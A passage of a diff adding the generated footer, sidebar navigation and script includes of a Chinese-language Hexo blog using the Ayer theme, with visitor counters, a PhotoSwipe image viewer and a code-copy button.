+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
+        <span class="division">|</span>
+        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s4.cnzz.com/z_stat.php?id=1278951134&amp;web_id=1278951134'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Time"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/suibi">随笔</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Subtitle -->
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+      strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
+      startDelay: 0,
+      typeSpeed: 200,
+      loop: true,
+      backSpeed: 100,
+      showCursor: true
+    });
+  } catch (err) {
+    console.log(err)
+  }
+</script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+    
+  </div>
+</body>
+
+</html>
